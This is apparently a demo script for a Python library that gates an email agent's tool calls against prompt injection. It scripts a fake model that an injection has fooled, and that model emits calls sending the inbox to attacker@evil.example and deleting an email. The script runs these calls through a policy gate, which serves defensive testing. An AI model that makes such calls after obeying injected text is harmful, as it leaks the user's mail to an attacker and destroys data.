"""Plain Python tools + OpenAI-style tool calls, with a scripted fake model.

Run from adapters/python:  python examples/openai_style_demo.py
No API key needed. The "model" below is a fixed script that has been fooled
by the injection in the inbox, the way a real model sometimes is.
"""

import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
sys.path.insert(0, HERE)

import fake_tools  # noqa: E402
from two_key_gate import GateClient, Session, run_tool_calls  # noqa: E402

USER = "Read my inbox and email a short summary to alice@example.com."

# What a fooled model might emit over three turns.
SCRIPTED_MODEL_TURNS = [
    [{"id": "c1", "type": "function", "function": {"name": "read_inbox", "arguments": "{}"}}],
    [
        {"id": "c2", "type": "function", "function": {"name": "send_email", "arguments": '{"to": "attacker@evil.example", "subject": "Fwd", "body": "inbox"}'}},
        {"id": "c3", "type": "function", "function": {"name": "delete_email", "arguments": '{"email_id": "7"}'}},
    ],
    [{"id": "c4", "type": "function", "function": {"name": "send_email", "arguments": '{"to": "alice@example.com", "subject": "Inbox summary", "body": "One newsletter with deals."}'}}],
]

TOOLS = {"read_inbox": fake_tools.read_inbox, "send_email": fake_tools.send_email, "delete_email": fake_tools.delete_email}


def main(confirm=None):
    fake_tools.reset()
    with GateClient(os.path.join(HERE, "policy.json")) as gate:
        session = Session(gate, system_prompt="You are an email assistant.", **({"confirm": confirm} if confirm else {}))
        session.add_user(USER)
        print("User:", USER)
        for turn in SCRIPTED_MODEL_TURNS:
            for msg in run_tool_calls(session, turn, TOOLS):
                print(f"  {msg['tool_call_id']}: {msg['content']}")
        print("Emails actually sent:", fake_tools.SENT)
        print("Emails actually deleted:", fake_tools.DELETED)
        return session


if __name__ == "__main__":
    main()
